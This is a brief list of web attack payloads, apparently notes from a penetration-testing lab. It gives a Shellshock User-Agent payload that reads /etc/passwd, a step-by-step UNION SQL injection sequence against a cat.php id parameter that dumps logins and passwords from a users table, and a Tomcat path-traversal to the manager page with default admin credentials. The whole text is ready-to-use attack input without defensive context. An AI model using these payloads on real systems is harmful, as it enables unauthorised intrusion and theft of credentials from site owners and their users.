01 - cgi-bin/status/ - CVE-2014-6271 - User-Agent: () { :;}; echo $(</etc/passwd) </br></br>

02 - SQLi - URL/cat.php?id=1 UNION SELECT 1,2,3,4 (detects number of columns)</br>
03 - SQLi - URL/cat.php?id=1 ORDER BY 3 (detects number of columns)</br>
04 - SQLi - URL/cat.php?id=1 UNION SELECT 1,@@version,3,4 </br>
05 - SQLi - URL/cat.php?id=1 UNION SELECT 1,current_user(),3,4 </br>
06 - SQLi - URL/cat.php?id=1 UNION SELECT 1,database(),3,4 </br>
07 - SQLi - URL/cat.php?id=1 UNION select 1, table_name,3,4 from information_schema.tables (tables) </br>
08 - SQLi - URL/cat.php?id=1 UNION select 1, column_name,3,4 from information_schema.columns (columns) </br>
09 - SQLi - URL/cat.php?id=1 UNION select 1, login,3,4 from users </br>
10 - SQLi - URL/cat.php?id=1 UNION select 1, password,3,4 from users </br>
11 - SQLi - URL/cat.php?id=1 UNION select 1, concat(login,':',password),3,4 from users (P4ssw0rd)</br></br>

12 - CVE-2007-1860 - URL/examples/%252e%252e/manager/html - go login (admin/null) </br>/br>
